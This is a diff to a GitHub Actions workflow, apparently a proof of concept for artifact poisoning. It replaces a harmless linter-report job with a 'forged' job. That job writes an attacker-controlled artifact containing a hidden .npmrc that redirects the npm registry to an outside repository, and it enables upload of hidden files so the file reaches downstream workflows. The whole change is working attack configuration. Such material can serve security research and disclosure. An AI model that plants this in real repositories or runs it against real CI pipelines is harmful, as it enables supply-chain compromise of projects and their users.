@@ -3,17 +3,19 @@ on:
   pull_request:
 
 jobs:
-  validate:
+  forged:
     runs-on: ubuntu-latest
     steps:
-      - name: Benign baseline artifact
+      - name: Craft attacker-controlled linter-report artifact
         run: |
-          echo "baseline report" > linter-report.txt
-          echo "1" > pr-number.txt
+          mkdir -p payload
+          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-npmreg/main/\naudit=false\nfund=false\nprogress=false\n' > payload/.npmrc
+          printf 'attacker controlled report\n' > payload/linter-report.txt
+          printf '1\n' > payload/pr-number.txt
+          ls -la payload
       - name: Upload linter report
         uses: actions/upload-artifact@v4
         with:
           name: linter-report
-          path: |
-            linter-report.txt
-            pr-number.txt
+          path: payload/
+          include-hidden-files: true
